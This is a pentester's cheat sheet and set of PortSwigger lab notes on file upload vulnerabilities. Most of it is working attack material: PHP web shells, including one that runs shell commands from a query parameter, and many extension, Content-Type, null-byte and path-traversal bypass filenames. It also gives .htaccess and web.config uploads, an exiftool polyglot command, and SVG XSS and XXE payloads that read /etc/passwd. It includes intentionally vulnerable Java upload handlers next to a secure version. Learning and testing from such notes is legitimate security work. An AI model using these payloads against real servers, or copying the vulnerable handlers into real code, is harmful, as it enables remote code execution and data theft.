tactic: Initial Access

**File Upload Vulnerabilities** occur when an application allows users to upload files without sufficiently validating the name, size, type, or content. The worst case is direct RCE by uploading a web shell — but even without execution, uploads can lead to path traversal, stored XSS, XXE, and SSRF.

```
Request comes in → server parses extension → looks up MIME mapping
If static:      → serve file contents directly
If executable:  → execute and return output (PHP, CGI, etc.)
If unknown:     → error or serve as plain text
```
Servers only execute file types they are explicitly configured to run. The goal of most bypass techniques is to either trick the server into thinking an executable is a safe type, or upload a configuration file that changes what the server will execute.

## Injection Points

- Avatar and profile picture upload endpoints
- Document and attachment upload endpoints
- Import functionality (CSV, XML, JSON uploads)
- `filename` parameter in `Content-Disposition`
- `Content-Type` header of the upload part
- File content itself (magic bytes, polyglot files)
- `.htaccess` / `web.config` upload if filename is not restricted

---

## Checklist

### Basic Detection

- [ ]  Upload a valid file and note where it is served from (`/files/avatars/test.jpg`)
- [ ]  Try uploading a `.php` webshell directly:

```php
	<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- [ ]  Then fetch it: `GET /files/avatars/test.php`

### Content-Type Bypass

- [ ]  Server validates `Content-Type` header but not actual file content — change it to an allowed type:

```http
	Content-Type: image/png
```

```
While the body still contains PHP code
```

### Extension Obfuscation

Try all of these if the basic `.php` is blocked:

**Double extensions:**

```
file.php.jpg
file.php.png
file.php5.jpg
```

**Reverse double extension (Apache misconfiguration):**

```
file.jpg.php
```

**Alternative PHP extensions:**

```
.php5    .php4    .php3    .phtml    .phar    .shtml
```

**Case variation:**

```
.pHp    .pHP5    .PhAr    .PHP
```

**Null byte — terminates the string before the safe extension:**

```
file.php%00.jpg
file.php%00.png
file.php\x00.gif
```

Server checks extension after null byte (`.jpg`), filesystem truncates at null → saves as `.php`

**Whitespace and special characters:**

```
file.php%20
file.php%0a
file.php%0d%0a.jpg
```

**Trailing dots (Windows):**

```
file.php......
```

Windows strips trailing dots when creating the file

**Right to Left Override (RTLO):**

```
name.%E2%80%AEphp.jpg  →  displays and saves as  name.gpj.php
```

**Slash in filename:**

```
file.php/
file.php.\
file.j/sp
file.j\sp
```

**Multiple special characters:**

```
file.jsp/././././.
```

### Path Traversal in Filename

- [ ]  URL-encode `../` in the filename to escape the upload directory:

```http
	Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2ftest.php"
```

```
File saves to parent directory → fetch from: `GET /files/test.php`
```

### .htaccess Upload (Apache)

- [ ]  Upload a `.htaccess` file that maps a custom extension to PHP execution:

```http
	Content-Disposition: form-data; name="avatar"; filename=".htaccess"
	Content-Type: text/plain

	AddType application/x-httpd-php .php5
```

- [ ]  Then upload your shell with the custom extension:

```http
	filename="shell.php5"
	Content-Type: text/plain

	<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- [ ]  Fetch: `GET /files/avatars/shell.php5`

### web.config Upload (IIS)

- [ ]  Upload a `web.config` to allow execution of a custom extension:

```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<configuration>
	    <system.webServer>
	        <handlers accessPolicy="Read, Script, Write">
	            <add name="web_config" path="*.config" verb="*"
	                 modules="IsapiModule"
	                 scriptProcessor="%windir%\system32\inetsrv\asp.dll"
	                 resourceType="Unspecified" requireAccess="Write"
	                 preCondition="bitness64" />
	        </handlers>
	        <security><requestFiltering><requestLimits maxAllowedContentLength="1073741824"/></requestFiltering></security>
	    </system.webServer>
	</configuration>
```

### Magic Bytes Bypass

- [ ]  Server checks the first bytes of the file rather than the extension — prepend valid image magic bytes before your payload:

```
	PNG:  \x89PNG\r\n\x1a\n
	JPG:  \xFF\xD8\xFF
	GIF:  GIF87a  or  GIF8;
```

```
In Burp hex editor, prepend the magic bytes to your PHP shell content
```

### Polyglot File (exiftool)

- [ ]  Create a file that is simultaneously a valid image AND contains executable PHP in the metadata:

```bash
	exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" echo.jpg -o polyglot.php
```

```
Upload as `polyglot.php` — passes image content check, executes as PHP
```

### SVG Upload — XSS and XXE

- [ ]  If SVGs are accepted, embed XSS:


```xml
	<svg xmlns="http://www.w3.org/2000/svg">
	    <script>alert(document.cookie)</script>
	</svg>
```

- [ ]  Or XXE via SVG:

```xml
	<?xml version="1.0"?>
	<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<svg><text>&xxe;</text></svg>
```

---

## Web Shell Payloads

**Read a file:**


```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Full command execution:**


```php
<?php echo system($_GET['cmd']); ?>
```

Fetch: `GET /files/avatars/shell.php?cmd=id`

**Compact one-liner:**


```php
<?php echo shell_exec($_GET[0]); ?>
```


### ToCheck

1) Unzip 
2) find workshop 
3) see that we can execute the values of the XML
4) check if we can XXE  in it 

## White Box Testing

**Vulnerable, only Content-Type is validated, not actual content:**

```java
@PostMapping("/upload/avatar")
public ResponseEntity<?> uploadAvatar(@RequestParam MultipartFile file) {
    String contentType = file.getContentType(); // ← attacker-controlled header

    if (!List.of("image/jpeg", "image/png", "image/gif").contains(contentType)) {
        return ResponseEntity.badRequest().body("Invalid file type");
    }

    // saves file using original filename with no further checks
    Path savePath = Paths.get("/var/www/uploads/" + file.getOriginalFilename());
    Files.write(savePath, file.getBytes());
    return ResponseEntity.ok().build();
}
```

**Vulnerable, extension check but null byte bypasses it:**


```java
@PostMapping("/upload")
public ResponseEntity<?> upload(@RequestParam MultipartFile file) {
    String filename = file.getOriginalFilename();

    if (!filename.endsWith(".jpg") && !filename.endsWith(".png")) {
        return ResponseEntity.badRequest().build();
    }

    // attacker sends filename="shell.php%00.jpg"
    // endsWith check passes, but filesystem saves as shell.php after null truncation
    Files.write(Paths.get("/uploads/" + filename), file.getBytes());
    return ResponseEntity.ok().build();
}
```

**Vulnerable, path traversal via filename:**

```java
@PostMapping("/upload")
public ResponseEntity<?> upload(@RequestParam MultipartFile file) {
    String filename = file.getOriginalFilename(); // ← can contain ../

    // attacker sends filename="%2e%2e%2fshell.php"
    // saves to /var/www/uploads/../shell.php = /var/www/shell.php → executable
    Path savePath = Paths.get("/var/www/uploads/").resolve(filename);
    Files.write(savePath, file.getBytes());
    return ResponseEntity.ok().build();
}
```

**Secure:**

```java
@PostMapping("/upload/avatar")
public ResponseEntity<?> uploadAvatar(@RequestParam MultipartFile file) {

    // 1. Validate by reading actual magic bytes — never trust Content-Type
    byte[] header = Arrays.copyOf(file.getBytes(), 8);
    if (!isValidImageHeader(header)) {
        return ResponseEntity.badRequest().body("Invalid file content");
    }

    // 2. Whitelist extensions
    String originalName = StringUtils.cleanPath(file.getOriginalFilename());
    String ext = originalName.substring(originalName.lastIndexOf('.')).toLowerCase();
    if (!Set.of(".jpg", ".jpeg", ".png", ".gif").contains(ext)) {
        return ResponseEntity.badRequest().body("Invalid extension");
    }

    // 3. Generate a random filename — never use the original
    String safeName = UUID.randomUUID().toString() + ext;

    // 4. Resolve and contain within upload directory
    Path baseDir = Paths.get("/var/www/uploads/").toRealPath();
    Path savePath = baseDir.resolve(safeName).normalize();
    if (!savePath.startsWith(baseDir)) {
        return ResponseEntity.status(403).build();
    }

    // 5. Save to a directory not served as executable by the web server
    Files.write(savePath, file.getBytes());
    return ResponseEntity.ok(safeName);
}

private boolean isValidImageHeader(byte[] header) {
    // JPEG: FF D8 FF
    if (header[0] == (byte)0xFF && header[1] == (byte)0xD8 && header[2] == (byte)0xFF) return true;
    // PNG: 89 50 4E 47
    if (header[0] == (byte)0x89 && header[1] == 0x50 && header[2] == 0x4E && header[3] == 0x47) return true;
    // GIF: 47 49 46 38
    if (header[0] == 0x47 && header[1] == 0x49 && header[2] == 0x46 && header[3] == 0x38) return true;
    return false;
}
```

# LABS

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

  **Remote code execution via web shell upload**
```HTTP
GET /files/avatars/file_echo.php
```


 **Web shell upload via Content-Type restriction bypass**
 
the server trusts the **content-Type** 

```HTTP
------WebKitFormBoundarySqMDd1VMBsOcs5j1
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?>
```

>Fetch
```HTTP
GET /files/avatars/file_echo.php
```

**Web shell upload via path traversal**

```HTTP

------WebKitFormBoundary18IPITth496oIf59
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2ftest.php"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?>

```

URL encoded the file name path traversal

```HTTP
GET /files/test.php 
```

**Web shell upload via extension blacklist bypass** 

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. they usually use the file `.htaccess` it basically adds a link of some kind for the applications like `svg+xml` we can basically link it to `.something`

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain


AddType application/x-httpd-php .php5
```

```http
------WebKitFormBoundarysS9S0fDtNAV28YZZ
Content-Disposition: form-data; name="avatar"; filename="test.php5"
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/test.php5
```

  **Web shell upload via obfuscated file extension**

 other obfuscation  worked the file was uploaded but it didn't execute only this worked 
```http
------WebKitFormBoundarymPLuAOPDA0B4TMmx
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?><?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/test.php

```

 **Remote code execution via polyglot web shell upload**

writes a comment that is executable 
```php

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" echo.jpg -o polyglot.php
```


## Resources

- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
- [HackTricks File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)